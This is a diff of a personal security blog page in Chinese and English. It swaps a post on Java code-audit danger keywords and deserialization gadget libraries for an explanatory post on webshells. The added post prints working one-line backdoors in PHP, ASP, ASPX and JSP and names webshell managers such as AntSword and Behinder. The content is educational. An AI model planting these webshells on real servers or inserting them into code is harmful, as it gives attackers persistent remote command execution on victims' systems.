@@ -16,23 +16,23 @@
   <meta name="author" content="Lane Gong">
   <meta name="keywords" content="">
   
-    <meta name="description" content="摘要： Java代码安全概述及相关危险函数+POC，不足之处，欢迎指正！">
+    <meta name="description" content="摘要： Through sorting out and learning some resources on the Internet, for webshell to do an understanding. Welcome to correct the deficiencies!">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java安全基础">
-<meta property="og:url" content="https://lanegong.github.io/posts/eb712b6d.html">
+<meta property="og:title" content="Webshell">
+<meta property="og:url" content="https://lanegong.github.io/posts/25c3ad45.html">
 <meta property="og:site_name" content="Lane&#39;s Blog">
-<meta property="og:description" content="摘要： Java代码安全概述及相关危险函数+POC，不足之处，欢迎指正！">
+<meta property="og:description" content="摘要： Through sorting out and learning some resources on the Internet, for webshell to do an understanding. Welcome to correct the deficiencies!">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lanegong.github.io/images/postimage/fjas.png">
-<meta property="article:published_time" content="2022-06-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-06-18T08:42:08.919Z">
+<meta property="og:image" content="https://lanegong.github.io/images/postimage/ws1.png">
+<meta property="article:published_time" content="2022-07-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-07T08:20:47.837Z">
 <meta property="article:author" content="Lane Gong">
-<meta property="article:tag" content="Java">
+<meta property="article:tag" content="webshell">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lanegong.github.io/images/postimage/fjas.png">
+<meta name="twitter:image" content="https://lanegong.github.io/images/postimage/ws1.png">
   
   
-  <title>Java安全基础 - Lane&#39;s Blog</title>
+  <title>Webshell - Lane&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -198,7 +198,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Java安全基础">
+            <span class="h2" id="subtitle" title="Webshell">
               
             </span>
 
@@ -208,8 +208,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-06-18 00:00" pubdate>
-        2022年6月18日 凌晨
+      <time datetime="2022-07-07 00:00" pubdate>
+        2022年7月7日 凌晨
       </time>
     </span>
   
@@ -219,7 +219,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.2k 字
+      2.7k 字
     </span>
   
 
@@ -228,7 +228,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19 分钟
+      23 分钟
     </span>
   
 
@@ -265,83 +265,87 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Java安全基础</h1>
+            <h1 style="display: none">Webshell</h1>
             
             <div class="markdown-body">
               <h2 id="摘要"><a class="markdownIt-Anchor" href="#摘要"></a> 摘要：</h2>
-<p>Java代码安全概述及相关危险函数+POC，不足之处，欢迎指正！</p>
+<p>Through sorting out and learning some resources on the Internet, for webshell to do an understanding. Welcome to correct the deficiencies!</p>
 <span id="more"></span>
 <div class="note note-warning">
-            <p>声明：本博客只是记录学习的过程，用以复习和互相交流学习，共同提升技术！切勿利用技术进行违法活动，后果自负！！维护国家网络安全是义不容辞的使命，网安人必将砥砺躬行！✊🏻</p>
+            <p>声明：本博客只是记录学习的过程，用以复习和互相交流学习，共同提升技术！切勿利用技术进行违法活动！！维护国家网络安全是义不容辞的使命，网安人必将砥砺躬行！✊🏻</p>
           </div>
-<h2 id="java安全概述"><a class="markdownIt-Anchor" href="#java安全概述"></a> Java安全概述</h2>
+<p>WebShell 就是以 ASP、PHP、JSP 或者 CGI 等网页文件形式的一种命令执行环境，也可以将其称做是一种网页后门。黑客在侵入了一个网站后，通常会将这些 ASP 或 PHP 后门文件与网站服务器 Web 目录下正常的网页文件混在一起，之后就可以使用浏览器来访问这些 ASP或者 PHP 后门，得到命令执行环境，以达到控制网站服务器的目的。可以上传下载文件、查看数据库、执行任意程序命令等。——《网络安全词汇术语汇编v8.0.3》</p>
+<h2 id="web-shell"><a class="markdownIt-Anchor" href="#web-shell"></a> Web Shell</h2>
+<p>Web shells are malicious scripts that enable threat actors to compromise web servers and launch additional attacks. Threat actors first penetrate a system or network and then install a web shell. From this point onwards, they use it as a permanent backdoor into the targeted web applications and any connected systems.</p>
+<h2 id="how-web-shells-work"><a class="markdownIt-Anchor" href="#how-web-shells-work"></a> How Web Shells Work</h2>
+<p>Web shell attacks have several stages: first, the attacker creates a persistent mechanism on the server enabling remote access. Then, they attempt to escalate privileges, and leverage the backdoor to attack the organization, or use its resources for criminal activity.</p>
 <blockquote>
-<p>只要有代码的地方就有漏洞</p>
+<p>Using file upload vulnerability, SQL injection vulnerability, RCE vulnerability and so on, put malicious files into the Web server, which is often said to be the “back door”, and then can carry out file management, database management, remote command execution, rights and other malicious operations.</p>
 </blockquote>
-<p>Java的漏洞出现的原因：</p>
+<p><img src="/images/postimage/ws1.png" srcset="/img/loading.gif" lazyload alt="Web Shell攻击的工作原理" /></p>
+<p>The common attack features of Webshell are as follows:</p>
 <ul>
-<li>程序员编码不当，编码时未考虑安全性。<br />
-例如，输入输出未做过滤&amp;净化、权限控制不完备、程序逻辑存在问题等。另外，对框架的使用不当造成的问题也不容忽视。 例如，典型的使用MyBatis框架是未使用预编译模式。</li>
-<li>第三方组件使用不当。<br />
-例如，使用了存在漏洞的低版本组件，组件开发模式未关闭等。</li>
+<li>
+<p>Persistent Remote Access</p>
+</li>
+<li>
+<p>Privilege Escalation</p>
+</li>
+<li>
+<p>Pivoting and Launching Attacks</p>
+</li>
+<li>
+<p>Bot Herding</p>
+</li>
+<li>
+<p>Extremely concealment</p>
+<p>Webshell can be nested within a normal web page and is not easy to kill. It can also through the server firewall, because with the control of the server or the remote host interaction data are passed through port 80, will therefore not be blocked by the firewall, in the case of no record flow, Webshell using post packages to send, will not be recorded in system log, will only record some data submitted in the Web log records.</p>
+</li>
 </ul>
-<h2 id="java危险函数及poc"><a class="markdownIt-Anchor" href="#java危险函数及poc"></a> Java危险函数及POC</h2>
+<h2 id="common-one-word-trojan-horse"><a class="markdownIt-Anchor" href="#common-one-word-trojan-horse"></a> Common One word Trojan horse</h2>
+<p>You can build your own environment to test the following Trojan. However, in the actual vulnerability shooting range or actual combat, the following commands will be detected and killed by firewalls because they are too simple, and often need to be transformed and encrypted and used with corresponding management <a target="_blank" rel="noopener" href="http://tools.It">tools.It</a> is recommended to know for yourself.</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">#php
+#1
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pwd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
+#2
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pwd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+#3
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+@<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+  
+#asp
+#1
+&lt;%eval request ("value")%>
+#2
+&lt;% execute(request("value")) %>
+
+#aspx
+&lt;%@ Page Language="Jscript" %> &lt;% eval(Request.Item["value"]) %>
+  
+#jsp
+&lt;%
+if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<h2 id="website-management-tools"><a class="markdownIt-Anchor" href="#website-management-tools"></a> Website Management TOOLS</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">AntSword</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">Behinder</a></li>
+<li>中国菜刀</li>
+<li>Cknife</li>
+<li>…</li>
+</ul>
+<h2 id="example"><a class="markdownIt-Anchor" href="#example"></a> Example</h2>
+<p>Upload the Trojan into the range environment through the vulnerability and connect the website with Antsword.</p>
+<p><img src="/images/postimage/ws2.png" srcset="/img/loading.gif" lazyload alt="" /></p>
 <blockquote>
-<p>参考资料：<a target="_blank" rel="noopener" href="https://github.com/7hang/--Java">https://github.com/7hang/--Java</a></p>
-<p>POC源码已上传至Github：<a target="_blank" rel="noopener" href="https://github.com/LaneGong/JavaCodeAudit">https://github.com/LaneGong/JavaCodeAudit</a></p>
-</blockquote>
-<h3 id="任意代码命令执行os命令注入"><a class="markdownIt-Anchor" href="#任意代码命令执行os命令注入"></a> 任意代码|命令执行/OS命令注入</h3>
-<p>常见关键字：</p>
-<p>System|exec|passthru|popen|shell_exec|eval|preg_replace|str_replace|call_user_func|getRuntime().exec|system|execlp|execvp|ShellExecute|wsystem|popen(|getRuntime|ProcessBuilder|execfile|input|Shell|ShellExecuteForExplore(|ShellExecute|execute|.exec|/bin/sh、/bin/bash|cmd</p>
-<p>命令执行POC（使用Runtime类的exec方法），可以发现直接调用起了系统的计算器应用。</p>
-<p><img src="/images/postimage/jas1.png" srcset="/img/loading.gif" lazyload alt="" /></p>
-<blockquote>
-<p>第二种方法没成功，还在研究当中…</p>
-</blockquote>
-<h3 id="反序列化方法"><a class="markdownIt-Anchor" href="#反序列化方法"></a> 反序列化方法</h3>
-<p>常见关键字</p>
-<p>ObjectInputStream.readObject｜ObjectInputStream.readUnshared｜XMLDecoder.readObject<br />
-Yaml.load｜XStream.fromXML｜ObjectMapper.readValue｜JSON.parseObject｜Serializable</p>
-<p>常见可利用基础库</p>
-<p>commons-io 2.4｜commons-collections 3.1｜commons-logging 1.2｜commons-beanutils 1.9.2<br />
-org.slf4j:slf4j-api 1.7.21｜com.mchange:mchange-commons-java 0.2.11<br />
-org.apache.commons:commons-collections 4.0｜com.mchange:c3p0 0.9.5.2｜org.beanshell:bsh 2.0b5<br />
-org.codehaus.groovy:groovy 2.3.9｜org.springframework:spring-aop4.1.4.RELEASE</p>
-<p><strong>Java实现序列化和反序列化的过程</strong></p>
+<p><strong>Reference</strong></p>
 <ol>
-<li>实现序列化的必备要求：<br />
-只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）</li>
-<li>JDK中序列化和反序列化的API：<br />
-java.io.ObjectInputStream：对象输入流。<br />
-该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。<br />
-java.io.ObjectOutputStream：对象输出流。<br />
-该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</li>
+<li><a target="_blank" rel="noopener" href="https://www.imperva.com/learn/application-security/web-shell/">Web Shell</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/235651.html">一文详解Webshell</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lady_killer9/article/details/120286817">网络安全-webshell详解（原理、攻击、检测与防御）</a></li>
 </ol>
-<p><strong>序列化和反序列化POC</strong></p>
-<p><img src="/images/postimage/jas2.png" srcset="/img/loading.gif" lazyload alt="序列化" /></p>
-<p><img src="/images/postimage/jas3.png" srcset="/img/loading.gif" lazyload alt="反序列化" /></p>
-<h3 id="xml解析xxe"><a class="markdownIt-Anchor" href="#xml解析xxe"></a> Xml解析(XXE)</h3>
-<blockquote>
-<p>XXE：XML External Entity Injection XML外部实体注入</p>
 </blockquote>
-<p>常见关键字：<br />
-Documentbuilder｜DocumentBuilderFactory｜SAXReader｜SAXParser｜SAXParserFactory｜SAXBuilder<br />
-TransformerFactory｜reqXml|getInputStream｜XMLReaderFactory｜.newInstance｜SchemaFactory<br />
-SAXTransformerFactory｜javax.xml.bind｜XMLReader｜XmlUtils.get｜Validator</p>
-<p>XML解析POC</p>
-<p><img src="/images/postimage/jas4.png" srcset="/img/loading.gif" lazyload alt="" /></p>
-<h3 id="执行sql语句方法"><a class="markdownIt-Anchor" href="#执行sql语句方法"></a> 执行SQL语句方法</h3>
-<p>常见关键字：<br />
-Select｜insert｜update|delete｜java.sql.Connection|Statement｜.execute.executeQuery｜jdbcTemplate|queryForInt|queryForObject｜queryForMap|getConnection<br />
-PreparedStatement｜Statement｜execute|jdbcTemplate｜queryForInt|queryForObject<br />
-queryForMap｜executeQuery｜getConnection</p>
-<p><strong>Java运行sql（oracle）</strong></p>
-<ul>
-<li>jdbc驱动包</li>
-<li>注册oracle jdbc驱动程序</li>
-<li>链接数据库</li>
-<li>创建JDBC Statement对象来执行sql语句</li>
-</ul>
 
             </div>
             <hr>
@@ -353,7 +357,7 @@ queryForMap｜executeQuery｜getConnection</p>
                     
                       <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF/%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/">代码安全</a>
+                      <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF/Web%E5%AE%89%E5%85%A8/">Web安全</a>
                     
                   </div>
                 
@@ -361,7 +365,7 @@ queryForMap｜executeQuery｜getConnection</p>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                      <a class="hover-with-bg" href="/tags/webshell/">webshell</a>
                     
                   </div>
                 
@@ -378,18 +382,12 @@ queryForMap｜executeQuery｜getConnection</p>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/25c3ad45.html">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Webshell</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/f501cb53.html">
-                        <span class="hidden-mobile">IDEA集成Tomcat创建web项目以及简单的Servelet接口开发</span>
+                      <a href="/posts/eb712b6d.html">
+                        <span class="hidden-mobile">Java安全基础</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
